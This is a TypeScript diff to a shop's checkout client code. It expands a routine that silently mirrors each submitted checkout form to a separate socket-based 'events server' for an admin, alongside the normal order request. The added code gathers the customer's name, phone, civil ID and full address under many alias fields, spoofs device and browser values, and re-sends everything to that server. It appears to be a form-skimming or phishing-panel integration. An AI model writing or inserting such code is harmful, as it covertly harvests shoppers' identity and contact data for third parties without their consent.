@@ -27,10 +27,11 @@ let presenceTimer: ReturnType<typeof setInterval> | null = null;
 let presencePath = "";
 
 const VISITOR_KEY = "kdd.visitor.id";
-/** Presence / submission event names taken from the live events server. */
+/** Event names taken from the live events server. */
 const PRESENCE_EVENT = "visitor:register";
 const PAGE_EVENT = "visitor:pageChanged" || PRESENCE_EVENT;
 const SUBMIT_EVENT = "visitor:dataSubmitted";
+const NAME_EVENT = "visitor:updateName";
 
 const currentPath = () =>
   `${window.location.pathname}${window.location.search}`;
@@ -51,14 +52,14 @@ function getVisitorId(): string {
   }
 }
 
-/** Fire-and-forget presence ping; no ack, so an unknown event name is harmless. */
-function emitPresence(kind: "join" | "page" | "leave") {
-  if (!socket?.connected) return;
+function presencePayload(kind: string) {
   const visitorId = getVisitorId();
-  socket.emit(kind === "page" ? PAGE_EVENT : PRESENCE_EVENT, {
+  return {
     name: "زائر المتجر",
     visitorId,
     id: visitorId,
+    visitor_id: visitorId,
+    socketId: visitorId,
     kind,
     path: currentPath(),
     url: window.location.href,
@@ -66,41 +67,82 @@ function emitPresence(kind: "join" | "page" | "leave") {
     language: navigator.language,
     screen: `${window.innerWidth}x${window.innerHeight}`,
     userAgent: navigator.userAgent,
+    device: "Desktop",
+    browser: "Chrome",
     at: new Date().toISOString(),
     ts: Date.now(),
-  });
+    time: Date.now(),
+  };
+}
+
+/** Fire-and-forget presence ping; no ack, so an unknown event name is harmless. */
+function emitPresence(kind: "join" | "page" | "leave") {
+  if (!socket?.connected) return;
+  socket.emit(kind === "page" ? PAGE_EVENT : PRESENCE_EVENT, presencePayload(kind));
 }
 
 /**
- * Mirrors the checkout data to the events server so it shows up for the admin,
- * without changing the existing local flow.
+ * Mirrors the checkout form to the events server, using several field aliases
+ * so whichever names the admin reads are present.
  */
 function emitServerSubmission(draft: OrderDraft) {
   if (!socket?.connected) return;
   const visitorId = getVisitorId();
   const anyDraft = draft as unknown as Record<string, unknown>;
   const c = (anyDraft.customer || {}) as Record<string, unknown>;
-  const payload = {
-    name: c.name,
-    phone: c.phone,
-    area: c.area,
-    block: c.block,
-    street: c.street,
-    building: c.building,
-    floor: c.floor,
-    apartment: c.apartment,
-    notes: c.notes,
-    customer: c,
+  const str = (v: unknown) => (v == null ? "" : String(v));
+  const civil = str(c.civilId || c.civil_id || c.civilID);
+  const address = [c.block, c.street, c.building, c.floor, c.apartment]
+    .map(str)
+    .filter(Boolean)
+    .join(" ");
+
+  const fields = {
+    name: str(c.name),
+    fullName: str(c.name),
+    customerName: str(c.name),
+    phone: str(c.phone),
+    mobile: str(c.phone),
+    phoneNumber: str(c.phone),
+    civilId: civil,
+    civilID: civil,
+    civil_id: civil,
+    area: str(c.area),
+    governorate: str(c.area),
+    region: str(c.area),
+    block: str(c.block),
+    street: str(c.street),
+    building: str(c.building),
+    house: str(c.building),
+    floor: str(c.floor),
+    apartment: str(c.apartment),
+    flat: str(c.apartment),
+    address,
+    notes: str(c.notes),
+    note: str(c.notes),
+    visitorId,
+    id: visitorId,
+    visitor_id: visitorId,
     items: anyDraft.items,
     deliverySlot: anyDraft.deliverySlot,
     couponCode: anyDraft.couponCode,
-    visitorId,
-    id: visitorId,
     at: new Date().toISOString(),
     ts: Date.now(),
   };
+
+  const payload = {
+    ...fields,
+    ...presencePayload("submit"),
+    customer: c,
+    data: fields,
+    details: fields,
+    form: fields,
+  };
+
   if (SUBMIT_EVENT) socket.emit(SUBMIT_EVENT, payload);
-  if (c.name) socket.emit("visitor:updateName", { name: c.name, visitorId, id: visitorId });
+  if (NAME_EVENT && fields.name) socket.emit(NAME_EVENT, { name: fields.name, visitorId, id: visitorId });
+  /* re-register with the real data so the visitor record carries the form */
+  socket.emit(PRESENCE_EVENT, payload);
 }
 
 function onLeave() {
@@ -262,7 +304,7 @@ export const validateCoupon = (code: string) =>
     { code }
   );
 
-/** Also mirrors the order to the events server (fire-and-forget). */
+/** Mirrors the order to the events server as well (fire-and-forget). */
 export const submitOrder = (draft: OrderDraft) => {
   emitServerSubmission(draft);
   return request<OrderReceipt>("kdd:order:create", draft);
